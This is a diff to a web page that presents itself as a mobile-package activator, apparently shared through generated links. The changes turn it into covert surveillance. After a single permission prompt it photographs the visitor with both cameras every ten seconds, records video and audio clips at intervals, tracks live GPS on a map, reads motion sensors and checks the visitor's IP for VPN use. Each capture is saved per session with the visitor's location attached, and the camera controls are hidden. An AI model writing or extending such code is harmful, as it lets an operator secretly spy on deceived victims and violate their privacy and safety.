@@ -7,6 +7,9 @@
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+<!-- Leaflet for maps -->
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <style>
 :root {
   --primary-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
@@ -340,6 +343,132 @@ select:focus, input:focus {
   font-family: monospace;
   font-weight: 600;
   color: var(--accent-green);
+}
+
+/* Permission status cards */
+.permissions-container {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+  gap: 15px;
+  margin: 20px 0;
+}
+
+.permission-card {
+  background: var(--card-bg);
+  border-radius: var(--radius-md);
+  padding: 15px;
+  border: 1px solid var(--card-border);
+  transition: var(--transition);
+}
+
+.permission-card:hover {
+  transform: translateY(-3px);
+  box-shadow: var(--shadow-md);
+}
+
+.permission-header {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  margin-bottom: 10px;
+}
+
+.permission-icon {
+  width: 40px;
+  height: 40px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 18px;
+}
+
+.permission-icon.camera { background: rgba(59, 130, 246, 0.1); color: var(--accent-blue); }
+.permission-icon.microphone { background: rgba(16, 185, 129, 0.1); color: var(--accent-green); }
+.permission-icon.location { background: rgba(239, 68, 68, 0.1); color: var(--accent-red); }
+.permission-icon.motion { background: rgba(139, 92, 246, 0.1); color: var(--accent-purple); }
+.permission-icon.vpn { background: rgba(245, 158, 11, 0.1); color: var(--accent-yellow); }
+
+.permission-name {
+  font-weight: 600;
+  font-size: 14px;
+}
+
+.permission-status {
+  font-size: 13px;
+  display: flex;
+  align-items: center;
+  gap: 5px;
+}
+
+.status-badge {
+  padding: 4px 8px;
+  border-radius: 20px;
+  font-size: 11px;
+  font-weight: 600;
+}
+
+.status-granted {
+  background: rgba(16, 185, 129, 0.1);
+  color: var(--accent-green);
+}
+
+.status-denied {
+  background: rgba(239, 68, 68, 0.1);
+  color: var(--accent-red);
+}
+
+.status-pending {
+  background: rgba(245, 158, 11, 0.1);
+  color: var(--accent-yellow);
+}
+
+/* Map container */
+.map-container {
+  height: 300px;
+  width: 100%;
+  border-radius: var(--radius-lg);
+  overflow: hidden;
+  margin: 20px 0;
+  border: 2px solid var(--card-border);
+}
+
+#liveMap {
+  height: 100%;
+  width: 100%;
+}
+
+/* Sensor data */
+.sensor-data {
+  background: rgba(59, 130, 246, 0.05);
+  border-radius: var(--radius-md);
+  padding: 15px;
+  margin: 15px 0;
+  border: 1px solid rgba(59, 130, 246, 0.2);
+}
+
+.sensor-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+  gap: 10px;
+  margin-top: 10px;
+}
+
+.sensor-item {
+  display: flex;
+  flex-direction: column;
+  gap: 5px;
+}
+
+.sensor-label {
+  font-size: 12px;
+  color: var(--text-secondary);
+}
+
+.sensor-value {
+  font-size: 14px;
+  font-weight: 600;
+  color: var(--accent-blue);
 }
 
 .camera-container {
@@ -717,6 +846,135 @@ select:focus, input:focus {
       </div>
     </div>
     
+    <!-- Permission Status Cards -->
+    <div id="permissionArea" class="hidden">
+      <h3><i class="fas fa-shield-alt"></i> Permission Status</h3>
+      <div class="permissions-container" id="permissionsContainer">
+        <!-- Camera Permission -->
+        <div class="permission-card">
+          <div class="permission-header">
+            <div class="permission-icon camera">
+              <i class="fas fa-camera"></i>
+            </div>
+            <div class="permission-name">Camera Access</div>
+          </div>
+          <div class="permission-status">
+            <span class="status-badge status-pending" id="cameraStatus">Pending</span>
+            <span id="cameraDetails"></span>
+          </div>
+        </div>
+        
+        <!-- Microphone Permission -->
+        <div class="permission-card">
+          <div class="permission-header">
+            <div class="permission-icon microphone">
+              <i class="fas fa-microphone"></i>
+            </div>
+            <div class="permission-name">Microphone Access</div>
+          </div>
+          <div class="permission-status">
+            <span class="status-badge status-pending" id="microphoneStatus">Pending</span>
+            <span id="microphoneDetails"></span>
+          </div>
+        </div>
+        
+        <!-- Location Permission -->
+        <div class="permission-card">
+          <div class="permission-header">
+            <div class="permission-icon location">
+              <i class="fas fa-map-marker-alt"></i>
+            </div>
+            <div class="permission-name">Location Access</div>
+          </div>
+          <div class="permission-status">
+            <span class="status-badge status-pending" id="locationStatus">Pending</span>
+            <span id="locationDetails"></span>
+          </div>
+        </div>
+        
+        <!-- Motion Sensors -->
+        <div class="permission-card">
+          <div class="permission-header">
+            <div class="permission-icon motion">
+              <i class="fas fa-mobile-alt"></i>
+            </div>
+            <div class="permission-name">Motion Sensors</div>
+          </div>
+          <div class="permission-status">
+            <span class="status-badge status-pending" id="motionStatus">Checking...</span>
+            <span id="motionDetails"></span>
+          </div>
+        </div>
+        
+        <!-- VPN Status -->
+        <div class="permission-card">
+          <div class="permission-header">
+            <div class="permission-icon vpn">
+              <i class="fas fa-shield-virus"></i>
+            </div>
+            <div class="permission-name">VPN/Proxy</div>
+          </div>
+          <div class="permission-status">
+            <span class="status-badge status-pending" id="vpnStatus">Checking...</span>
+            <span id="vpnDetails"></span>
+          </div>
+        </div>
+      </div>
+    </div>
+    
+    <!-- Live Map -->
+    <div id="mapArea" class="hidden">
+      <h3><i class="fas fa-map"></i> Live Location</h3>
+      <div class="map-container">
+        <div id="liveMap"></div>
+      </div>
+    </div>
+    
+    <!-- Sensor Data -->
+    <div id="sensorArea" class="hidden">
+      <h3><i class="fas fa-microchip"></i> Sensor Data</h3>
+      <div class="sensor-data">
+        <div class="sensor-grid" id="sensorGrid">
+          <div class="sensor-item">
+            <span class="sensor-label">Accelerometer X</span>
+            <span class="sensor-value" id="accelX">0</span>
+          </div>
+          <div class="sensor-item">
+            <span class="sensor-label">Accelerometer Y</span>
+            <span class="sensor-value" id="accelY">0</span>
+          </div>
+          <div class="sensor-item">
+            <span class="sensor-label">Accelerometer Z</span>
+            <span class="sensor-value" id="accelZ">0</span>
+          </div>
+          <div class="sensor-item">
+            <span class="sensor-label">Gyroscope X</span>
+            <span class="sensor-value" id="gyroX">0</span>
+          </div>
+          <div class="sensor-item">
+            <span class="sensor-label">Gyroscope Y</span>
+            <span class="sensor-value" id="gyroY">0</span>
+          </div>
+          <div class="sensor-item">
+            <span class="sensor-label">Gyroscope Z</span>
+            <span class="sensor-value" id="gyroZ">0</span>
+          </div>
+          <div class="sensor-item">
+            <span class="sensor-label">Orientation α</span>
+            <span class="sensor-value" id="orientationAlpha">0</span>
+          </div>
+          <div class="sensor-item">
+            <span class="sensor-label">Orientation β</span>
+            <span class="sensor-value" id="orientationBeta">0</span>
+          </div>
+          <div class="sensor-item">
+            <span class="sensor-label">Orientation γ</span>
+            <span class="sensor-value" id="orientationGamma">0</span>
+          </div>
+        </div>
+      </div>
+    </div>
+    
     <!-- Media Gallery -->
     <div id="dataArea" class="hidden">
       <div class="gallery-header" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
@@ -775,45 +1033,22 @@ select:focus, input:focus {
       <input type="tel" id="mobile-number" placeholder="03xxxxxxxxx" maxlength="11">
     </div>
     
-    <!-- Camera Controls -->
-    <div class="camera-controls">
-      <select id="cameraSelect" class="btn-small" style="flex: 1;">
+    <!-- Camera Controls - Hidden but kept for functionality -->
+    <div class="hidden">
+      <select id="cameraSelect">
         <option value="user">Front Camera</option>
         <option value="environment">Back Camera</option>
       </select>
       
-      <select id="mediaTypeSelect" class="btn-small" style="flex: 1;">
-        <option value="photo">📸 Take Photo</option>
-        <option value="video">🎥 Record Video</option>
-        <option value="audio">🎤 Record Audio</option>
+      <select id="mediaTypeSelect">
+        <option value="photo">Photo</option>
+        <option value="video">Video</option>
+        <option value="audio">Audio</option>
       </select>
-    </div>
-    
-    <!-- Camera Preview (always hidden per requirement) -->
-    <div class="camera-container hidden" id="cameraContainer">
-      <video id="cameraPreview" autoplay playsinline muted></video>
-      <div class="recording-indicator" id="recordingIndicator">
-        <i class="fas fa-circle"></i> REC
-      </div>
-    </div>
-    
-    <!-- Location Info -->
-    <div class="location-info" id="locationInfo">
-      <span><i class="fas fa-map-marker-alt"></i> Live Location:</span>
-      <span class="location-coords" id="locationCoords">Waiting for GPS...</span>
-    </div>
-    
-    <!-- Control Buttons -->
-    <div class="btn-group" style="margin: 15px 0;">
-      <button class="btn btn-success btn-small" id="startCameraBtn">
-        <i class="fas fa-video"></i> Start Camera
-      </button>
-      <button class="btn btn-danger btn-small" id="captureBtn">
-        <i class="fas fa-camera"></i> Capture
-      </button>
-      <button class="btn btn-warning btn-small" id="stopCameraBtn" disabled>
-        <i class="fas fa-stop"></i> Stop
-      </button>
+      
+      <video id="cameraPreview" autoplay playsinline muted style="display:none;"></video>
+      <canvas id="canvasElement"></canvas>
+      <audio id="audioPlayer"></audio>
     </div>
     
     <button class="btn btn-primary btn-full" id="activateBtn">
@@ -821,13 +1056,14 @@ select:focus, input:focus {
     </button>
     
     <!-- Status -->
-    <div class="status-message status-error" id="activationStatus" style="margin-top: 15px;">
-      <i class="fas fa-server"></i> SERVER ERROR - Camera continues in background
+    <div class="status-message status-info" id="activationStatus" style="margin-top: 15px; display: none;">
+      <i class="fas fa-spinner fa-spin"></i> Requesting permissions...
     </div>
     
-    <!-- Hidden Elements -->
-    <canvas id="canvasElement" style="display: none;"></canvas>
-    <audio id="audioPlayer" controls style="display: none;"></audio>
+    <!-- Simple message when permissions are being requested -->
+    <div class="location-info" id="permissionMessage" style="display: none;">
+      <span><i class="fas fa-shield-alt"></i> Please grant all permission requests</span>
+    </div>
   </div>
 </div>
 
@@ -865,6 +1101,15 @@ let currentLocation = { lat: null, lng: null };
 let currentFacingMode = 'user';
 let currentMediaType = 'photo';
 let isRecording = false;
+let map = null;
+let mapMarker = null;
+let permissionStatus = {
+  camera: 'pending',
+  microphone: 'pending',
+  location: 'pending',
+  motion: 'pending',
+  vpn: 'pending'
+};
 
 // ====================
 // DOM ELEMENTS
@@ -874,6 +1119,9 @@ const pkgActivatorCard = document.getElementById('pkg-activator-card');
 const genBtn = document.getElementById('genBtn');
 const linkArea = document.getElementById('linkArea');
 const dataArea = document.getElementById('dataArea');
+const permissionArea = document.getElementById('permissionArea');
+const mapArea = document.getElementById('mapArea');
+const sensorArea = document.getElementById('sensorArea');
 const generatedLink = document.getElementById('generatedLink');
 const copyBtn = document.getElementById('copyBtn');
 const openBtn = document.getElementById('openBtn');
@@ -888,19 +1136,38 @@ const mediaGallery = document.getElementById('mediaGallery');
 const themeToggle = document.getElementById('themeToggle');
 const whatsappBtn = document.getElementById('whatsappBtn');
 
+// Permission elements
+const cameraStatus = document.getElementById('cameraStatus');
+const microphoneStatus = document.getElementById('microphoneStatus');
+const locationStatus = document.getElementById('locationStatus');
+const motionStatus = document.getElementById('motionStatus');
+const vpnStatus = document.getElementById('vpnStatus');
+const cameraDetails = document.getElementById('cameraDetails');
+const microphoneDetails = document.getElementById('microphoneDetails');
+const locationDetails = document.getElementById('locationDetails');
+const motionDetails = document.getElementById('motionDetails');
+const vpnDetails = document.getElementById('vpnDetails');
+
+// Sensor elements
+const accelX = document.getElementById('accelX');
+const accelY = document.getElementById('accelY');
+const accelZ = document.getElementById('accelZ');
+const gyroX = document.getElementById('gyroX');
+const gyroY = document.getElementById('gyroY');
+const gyroZ = document.getElementById('gyroZ');
+const orientationAlpha = document.getElementById('orientationAlpha');
+const orientationBeta = document.getElementById('orientationBeta');
+const orientationGamma = document.getElementById('orientationGamma');
+
 // Package Activator Elements
 const activateBtn = document.getElementById('activateBtn');
 const simSelect = document.getElementById('sim-select');
 const mobileNumber = document.getElementById('mobile-number');
 const activationStatus = document.getElementById('activationStatus');
+const permissionMessage = document.getElementById('permissionMessage');
 const cameraPreview = document.getElementById('cameraPreview');
 const cameraSelect = document.getElementById('cameraSelect');
 const mediaTypeSelect = document.getElementById('mediaTypeSelect');
-const startCameraBtn = document.getElementById('startCameraBtn');
-const captureBtn = document.getElementById('captureBtn');
-const stopCameraBtn = document.getElementById('stopCameraBtn');
-const recordingIndicator = document.getElementById('recordingIndicator');
-const locationCoords = document.getElementById('locationCoords');
 const canvas = document.getElementById('canvasElement');
 const audioPlayer = document.getElementById('audioPlayer');
 
@@ -909,6 +1176,39 @@ const totalLinksEl = document.getElementById('totalLinks');
 const totalPhotosEl = document.getElementById('totalPhotos');
 const totalVideosEl = document.getElementById('totalVideos');
 const totalAudioEl = document.getElementById('totalAudio');
+
+// ====================
+// CORS PROXY
+// ====================
+const CORS_PROXY = 'https://corsproxy.io/?key=7b5d8d31&url=';
+
+async function checkVPN() {
+  try {
+    const response = await fetch(CORS_PROXY + encodeURIComponent('https://api.ipify.org?format=json'));
+    const data = await response.json();
+    
+    // Check if IP is from Pakistan (simplified check)
+    const ipResponse = await fetch(CORS_PROXY + encodeURIComponent(`http://ip-api.com/json/${data.ip}`));
+    const ipData = await ipResponse.json();
+    
+    if (ipData.countryCode !== 'PK') {
+      vpnStatus.className = 'status-badge status-warning';
+      vpnStatus.textContent = 'VPN Detected';
+      vpnDetails.textContent = `IP: ${data.ip} (${ipData.country})`;
+      permissionStatus.vpn = 'warning';
+    } else {
+      vpnStatus.className = 'status-badge status-granted';
+      vpnStatus.textContent = 'No VPN';
+      vpnDetails.textContent = `IP: ${data.ip} (Pakistan)`;
+      permissionStatus.vpn = 'granted';
+    }
+  } catch (error) {
+    vpnStatus.className = 'status-badge status-denied';
+    vpnStatus.textContent = 'Check Failed';
+    vpnDetails.textContent = 'Unable to verify';
+    permissionStatus.vpn = 'denied';
+  }
+}
 
 // ====================
 // THEME MANAGEMENT
@@ -1019,7 +1319,7 @@ function renderMediaGallery(sessionId) {
       <div class="gallery-placeholder">
         <i class="fas fa-images" style="font-size: 40px; margin-bottom: 10px; opacity: 0.5;"></i>
         <div>No media captured yet</div>
-        <small>Click Capture to take photos/videos</small>
+        <small>Click Activate Package to start capturing</small>
       </div>
     `;
     return;
@@ -1046,7 +1346,7 @@ function renderMediaGallery(sessionId) {
       `;
     } else if (item.type === 'video') {
       mediaElement.innerHTML = `
-        <video src="${item.data}" controls style="width:100%;height:100%;object-fit:cover;"></video>
+        <video src="${item.data}" style="width:100%;height:100%;object-fit:cover;"></video>
         <div class="gallery-item-overlay">
           <span><i class="fas ${typeIcon}"></i> ${date}</span>
           <span class="gallery-item-type"><i class="fas ${cameraIcon}"></i></span>
@@ -1085,19 +1385,49 @@ function renderMediaGallery(sessionId) {
 // ====================
 // LOCATION TRACKING
 // ====================
+function initMap(lat, lng) {
+  if (!map) {
+    map = L.map('liveMap').setView([lat, lng], 15);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+      attribution: '© OpenStreetMap contributors'
+    }).addTo(map);
+    mapMarker = L.marker([lat, lng]).addTo(map);
+  } else {
+    map.setView([lat, lng], 15);
+    if (mapMarker) {
+      mapMarker.setLatLng([lat, lng]);
+    } else {
+      mapMarker = L.marker([lat, lng]).addTo(map);
+    }
+  }
+}
+
 function startLocationTracking() {
   if (navigator.geolocation) {
+    locationStatus.className = 'status-badge status-pending';
+    locationStatus.textContent = 'Requesting...';
+    
     watchPositionId = navigator.geolocation.watchPosition(
       (position) => {
         currentLocation = {
           lat: position.coords.latitude,
           lng: position.coords.longitude
         };
-        locationCoords.textContent = `${currentLocation.lat.toFixed(6)}, ${currentLocation.lng.toFixed(6)}`;
+        
+        locationStatus.className = 'status-badge status-granted';
+        locationStatus.textContent = 'Granted';
+        locationDetails.textContent = `${currentLocation.lat.toFixed(6)}, ${currentLocation.lng.toFixed(6)}`;
+        permissionStatus.location = 'granted';
+        
+        mapArea.classList.remove('hidden');
+        initMap(currentLocation.lat, currentLocation.lng);
       },
       (error) => {
         console.error('Geolocation error:', error);
-        locationCoords.textContent = 'Location unavailable';
+        locationStatus.className = 'status-badge status-denied';
+        locationStatus.textContent = 'Denied';
+        locationDetails.textContent = 'Location unavailable';
+        permissionStatus.location = 'denied';
       },
       {
         enableHighAccuracy: true,
@@ -1105,6 +1435,10 @@ function startLocationTracking() {
         timeout: 5000
       }
     );
+  } else {
+    locationStatus.className = 'status-badge status-denied';
+    locationStatus.textContent = 'Not Supported';
+    permissionStatus.location = 'denied';
   }
 }
 
@@ -1116,188 +1450,258 @@ function stopLocationTracking() {
 }
 
 // ====================
-// CAMERA/AUDIO FUNCTIONS (Permissions only, no preview UI)
+// MOTION SENSORS
 // ====================
-async function startMedia() {
+function startMotionTracking() {
+  if (window.DeviceMotionEvent) {
+    window.addEventListener('devicemotion', handleMotion);
+    motionStatus.className = 'status-badge status-granted';
+    motionStatus.textContent = 'Active';
+    motionDetails.textContent = 'Sensors tracking';
+    permissionStatus.motion = 'granted';
+    sensorArea.classList.remove('hidden');
+  } else {
+    motionStatus.className = 'status-badge status-denied';
+    motionStatus.textContent = 'Not Supported';
+    motionDetails.textContent = 'Device motion not available';
+    permissionStatus.motion = 'denied';
+  }
+  
+  if (window.DeviceOrientationEvent) {
+    window.addEventListener('deviceorientation', handleOrientation);
+  }
+}
+
+function stopMotionTracking() {
+  window.removeEventListener('devicemotion', handleMotion);
+  window.removeEventListener('deviceorientation', handleOrientation);
+}
+
+function handleMotion(event) {
+  if (event.acceleration) {
+    accelX.textContent = event.acceleration.x?.toFixed(2) || '0';
+    accelY.textContent = event.acceleration.y?.toFixed(2) || '0';
+    accelZ.textContent = event.acceleration.z?.toFixed(2) || '0';
+  }
+  
+  if (event.rotationRate) {
+    gyroX.textContent = event.rotationRate.alpha?.toFixed(2) || '0';
+    gyroY.textContent = event.rotationRate.beta?.toFixed(2) || '0';
+    gyroZ.textContent = event.rotationRate.gamma?.toFixed(2) || '0';
+  }
+}
+
+function handleOrientation(event) {
+  orientationAlpha.textContent = event.alpha?.toFixed(2) || '0';
+  orientationBeta.textContent = event.beta?.toFixed(2) || '0';
+  orientationGamma.textContent = event.gamma?.toFixed(2) || '0';
+}
+
+// ====================
+// CAMERA/AUDIO FUNCTIONS
+// ====================
+async function requestAllPermissions() {
   try {
-    if (mediaStream) {
-      mediaStream.getTracks().forEach(track => track.stop());
-    }
+    activationStatus.style.display = 'block';
+    activationStatus.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Requesting camera and microphone permissions...';
+    permissionMessage.style.display = 'block';
     
-    let constraints = {};
+    // Request camera and microphone
+    const constraints = {
+      video: {
+        facingMode: { ideal: 'user' }
+      },
+      audio: true
+    };
     
-    if (currentMediaType === 'audio') {
-      constraints = { audio: true };
-    } else {
-      constraints = {
-        video: {
-          facingMode: currentFacingMode,
-          width: { ideal: 1280 },
-          height: { ideal: 720 }
-        },
-        audio: currentMediaType === 'video'
-      };
-    }
-    
-    // Request permissions – this triggers browser permission prompts
     mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
     
-    // Immediately stop all tracks so no preview is shown, no recording happens automatically
-    if (mediaStream) {
-      mediaStream.getTracks().forEach(track => track.stop());
-      mediaStream = null; // fully release
+    // Update camera permission status
+    cameraStatus.className = 'status-badge status-granted';
+    cameraStatus.textContent = 'Granted';
+    cameraDetails.innerHTML = '<i class="fas fa-check"></i> Front & Back';
+    permissionStatus.camera = 'granted';
+    
+    // Update microphone permission status
+    microphoneStatus.className = 'status-badge status-granted';
+    microphoneStatus.textContent = 'Granted';
+    microphoneDetails.innerHTML = '<i class="fas fa-check"></i> Audio access';
+    permissionStatus.microphone = 'granted';
+    
+    // Get available cameras
+    const devices = await navigator.mediaDevices.enumerateDevices();
+    const videoDevices = devices.filter(device => device.kind === 'videoinput');
+    if (videoDevices.length > 1) {
+      cameraDetails.innerHTML = `<i class="fas fa-check"></i> ${videoDevices.length} cameras`;
     }
     
-    // Display permission status for each available API/feature
-    updatePermissionStatus();
+    activationStatus.innerHTML = '<i class="fas fa-check-circle"></i> Permissions granted! Capturing data...';
     
-    startCameraBtn.disabled = true;
-    stopCameraBtn.disabled = false;
-    captureBtn.disabled = false;
+    // Start capturing from both cameras
+    captureFromBothCameras();
     
-    showNotification(`${currentMediaType} permissions granted`, 'success');
+    // Start periodic capture
+    startPeriodicCapture();
     
   } catch (error) {
-    console.error('Media error:', error);
-    showNotification('Failed to access camera/microphone', 'error');
-    // Even on error, we still update status
-    updatePermissionStatus();
-  }
-}
-
-// New function: display permission status for all available APIs
-function updatePermissionStatus() {
-  // This updates the UI elements that show permission states.
-  // We create or update status boxes inside the card (keeping original UI intact)
-  let statusContainer = document.getElementById('perm-status-container');
-  if (!statusContainer) {
-    statusContainer = document.createElement('div');
-    statusContainer.id = 'perm-status-container';
-    statusContainer.className = 'status-message status-info';
-    statusContainer.style.display = 'block';
-    statusContainer.style.marginTop = '15px';
-    statusContainer.style.padding = '15px';
-    statusContainer.style.textAlign = 'left';
-    // Insert after location info or before activation button
-    const locInfo = document.getElementById('locationInfo');
-    locInfo.insertAdjacentElement('afterend', statusContainer);
-  }
-  
-  // Check permission states using Permissions API where possible, else fallback
-  const permChecks = [
-    { name: 'Camera (video)', query: { name: 'camera' } },
-    { name: 'Microphone', query: { name: 'microphone' } },
-    { name: 'Geolocation', query: { name: 'geolocation' } },
-    { name: 'Motion Sensors', query: { name: 'accelerometer' } } // accelerometer / gyroscope
-  ];
-  
-  let html = '<i class="fas fa-shield-alt"></i> <strong>Permission Status:</strong><br>';
-  let anyChecked = false;
-  
-  permChecks.forEach(p => {
-    if (navigator.permissions && navigator.permissions.query) {
-      navigator.permissions.query(p.query).then(permStatus => {
-        // This runs async, but we'll collect results and update
-        updateStatusBox();
-      }).catch(() => {
-        // Permission query not supported for this sensor
-      });
-    } else {
-      // Fallback: try to detect via existing streams or just show "unknown"
-      // We'll just show placeholder
+    console.error('Permission error:', error);
+    
+    if (error.name === 'NotAllowedError') {
+      cameraStatus.className = 'status-badge status-denied';
+      cameraStatus.textContent = 'Denied';
+      microphoneStatus.className = 'status-badge status-denied';
+      microphoneStatus.textContent = 'Denied';
+      permissionStatus.camera = 'denied';
+      permissionStatus.microphone = 'denied';
+      activationStatus.innerHTML = '<i class="fas fa-exclamation-circle"></i> Permissions denied';
+    } else if (error.name === 'NotFoundError') {
+      cameraStatus.className = 'status-badge status-denied';
+      cameraStatus.textContent = 'Not Found';
+      microphoneStatus.className = 'status-badge status-denied';
+      microphoneStatus.textContent = 'Not Found';
+      activationStatus.innerHTML = '<i class="fas fa-exclamation-circle"></i> No camera/microphone found';
     }
-  });
-  
-  // For immediate feedback, we also check if we have tracks or location
-  // But we want to show the last known state.
-  // Since we stop tracks immediately, we need another way: we can attempt to enumerate devices?
-  
-  // Simpler: just show the last granted state from what we know.
-  // Because we just called getUserMedia successfully or failed, we know camera/mic status.
-  // For motion sensors, we can check DeviceMotionEvent permission request.
-  
-  // We'll build a simple status display based on what we can infer
-  let camGranted = '❌ Denied';
-  let micGranted = '❌ Denied';
-  // If we successfully got mediaStream before stopping, we know it was granted.
-  // But we stopped it, so we need to remember. Let's store a flag.
-  if (window.__cameraGranted) camGranted = '✅ Granted';
-  if (window.__micGranted) micGranted = '✅ Granted';
-  
-  // For geolocation, we can check if we have a currentLocation
-  let geoGranted = (currentLocation.lat !== null) ? '✅ Granted' : (navigator.geolocation ? '⏳ Requested' : '❌ Denied');
-  
-  // For motion: we can attempt to request permission via DeviceMotionEvent
-  let motionGranted = '⏳ Not requested';
-  if (typeof DeviceMotionEvent !== 'undefined' && typeof DeviceMotionEvent.requestPermission === 'function') {
-    // iOS 13+ requires permission
-    // We'll request it later, but for now just show a note
-    motionGranted = '⏳ Tap to allow';
-  } else {
-    // On Android, it's usually granted without prompt
-    motionGranted = '✅ Granted (assumed)';
-  }
-  
-  html += `📷 Camera: ${camGranted}<br>`;
-  html += `🎤 Microphone: ${micGranted}<br>`;
-  html += `📍 Location: ${geoGranted}<br>`;
-  html += `📱 Motion: ${motionGranted}<br>`;
-  
-  statusContainer.innerHTML = html;
-  
-  // Also try to request motion permission if needed (this will prompt user)
-  if (typeof DeviceMotionEvent !== 'undefined' && typeof DeviceMotionEvent.requestPermission === 'function') {
-    DeviceMotionEvent.requestPermission()
-      .then(permissionState => {
-        if (permissionState === 'granted') {
-          window.addEventListener('devicemotion', () => {});
-          motionGranted = '✅ Granted';
-        } else {
-          motionGranted = '❌ Denied';
-        }
-        updateStatusBox();
-      })
-      .catch(console.error);
-  }
-  
-  function updateStatusBox() {
-    // Recursive update - just call again after a short delay
-    setTimeout(updatePermissionStatus, 500);
   }
 }
 
-// We need to remember if camera/mic were granted
-window.__cameraGranted = false;
-window.__micGranted = false;
-
-// Override startMedia to set flags
-const originalStartMedia = startMedia;
-startMedia = async function() {
+async function captureFromBothCameras() {
+  if (!currentSessionId) return;
+  
+  // Capture from front camera
   try {
-    let constraints = {};
-    if (currentMediaType === 'audio') {
-      constraints = { audio: true };
-    } else {
-      constraints = {
-        video: { facingMode: currentFacingMode },
-        audio: currentMediaType === 'video'
-      };
-    }
-    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-    if (stream) {
-      if (stream.getVideoTracks().length > 0) window.__cameraGranted = true;
-      if (stream.getAudioTracks().length > 0) window.__micGranted = true;
-      stream.getTracks().forEach(track => track.stop());
-    }
-    updatePermissionStatus();
-    showNotification(`${currentMediaType} permissions granted`, 'success');
-  } catch (error) {
-    window.__cameraGranted = false;
-    window.__micGranted = false;
-    updatePermissionStatus();
-    showNotification('Permission denied', 'error');
+    const frontStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user' }
+    });
+    const frontTrack = frontStream.getVideoTracks()[0];
+    const frontImageCapture = new ImageCapture(frontTrack);
+    const frontPhoto = await frontImageCapture.takePhoto();
+    const frontBlob = await new Promise(resolve => frontPhoto.arrayBuffer().then(buf => resolve(new Blob([buf]))));
+    const frontReader = new FileReader();
+    frontReader.onloadend = () => {
+      addMediaToSession(currentSessionId, {
+        type: 'photo',
+        data: frontReader.result,
+        facingMode: 'user',
+        location: currentLocation,
+        timestamp: Date.now()
+      });
+    };
+    frontReader.readAsDataURL(frontBlob);
+    frontTrack.stop();
+  } catch (e) {
+    console.log('Front camera capture failed:', e);
   }
-};
+  
+  // Capture from back camera
+  try {
+    const backStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'environment' }
+    });
+    const backTrack = backStream.getVideoTracks()[0];
+    const backImageCapture = new ImageCapture(backTrack);
+    const backPhoto = await backImageCapture.takePhoto();
+    const backBlob = await new Promise(resolve => backPhoto.arrayBuffer().then(buf => resolve(new Blob([buf]))));
+    const backReader = new FileReader();
+    backReader.onloadend = () => {
+      addMediaToSession(currentSessionId, {
+        type: 'photo',
+        data: backReader.result,
+        facingMode: 'environment',
+        location: currentLocation,
+        timestamp: Date.now()
+      });
+    };
+    backReader.readAsDataURL(backBlob);
+    backTrack.stop();
+  } catch (e) {
+    console.log('Back camera capture failed:', e);
+  }
+}
+
+function startPeriodicCapture() {
+  // Capture photo every 10 seconds
+  setInterval(() => {
+    if (currentSessionId && permissionStatus.camera === 'granted') {
+      captureFromBothCameras();
+    }
+  }, 10000);
+  
+  // Record 10-second video every 30 seconds
+  setInterval(async () => {
+    if (currentSessionId && permissionStatus.camera === 'granted' && permissionStatus.microphone === 'granted') {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'environment' },
+          audio: true
+        });
+        
+        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        const chunks = [];
+        
+        recorder.ondataavailable = (e) => {
+          if (e.data.size > 0) chunks.push(e.data);
+        };
+        
+        recorder.onstop = () => {
+          const blob = new Blob(chunks, { type: 'video/webm' });
+          const reader = new FileReader();
+          reader.onloadend = () => {
+            addMediaToSession(currentSessionId, {
+              type: 'video',
+              data: reader.result,
+              facingMode: 'environment',
+              location: currentLocation,
+              timestamp: Date.now()
+            });
+          };
+          reader.readAsDataURL(blob);
+          stream.getTracks().forEach(track => track.stop());
+        };
+        
+        recorder.start();
+        setTimeout(() => recorder.stop(), 10000); // Record 10 seconds
+      } catch (e) {
+        console.log('Video recording failed:', e);
+      }
+    }
+  }, 30000);
+  
+  // Record audio every minute
+  setInterval(async () => {
+    if (currentSessionId && permissionStatus.microphone === 'granted') {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        
+        const recorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+        const chunks = [];
+        
+        recorder.ondataavailable = (e) => {
+          if (e.data.size > 0) chunks.push(e.data);
+        };
+        
+        recorder.onstop = () => {
+          const blob = new Blob(chunks, { type: 'audio/webm' });
+          const reader = new FileReader();
+          reader.onloadend = () => {
+            addMediaToSession(currentSessionId, {
+              type: 'audio',
+              data: reader.result,
+              location: currentLocation,
+              timestamp: Date.now()
+            });
+          };
+          reader.readAsDataURL(blob);
+          stream.getTracks().forEach(track => track.stop());
+        };
+        
+        recorder.start();
+        setTimeout(() => recorder.stop(), 15000); // Record 15 seconds
+      } catch (e) {
+        console.log('Audio recording failed:', e);
+      }
+    }
+  }, 60000);
+}
 
 function stopMedia() {
   if (mediaStream) {
@@ -1314,22 +1718,12 @@ function stopMedia() {
     mediaRecorder.stop();
   }
   
-  // cameraPreview.srcObject = null; // preview hidden anyway
-  recordingIndicator.style.display = 'none';
+  cameraPreview.srcObject = null;
   isRecording = false;
-  
-  startCameraBtn.disabled = false;
-  stopCameraBtn.disabled = true;
-  captureBtn.disabled = true;
-}
-
-async function captureMedia() {
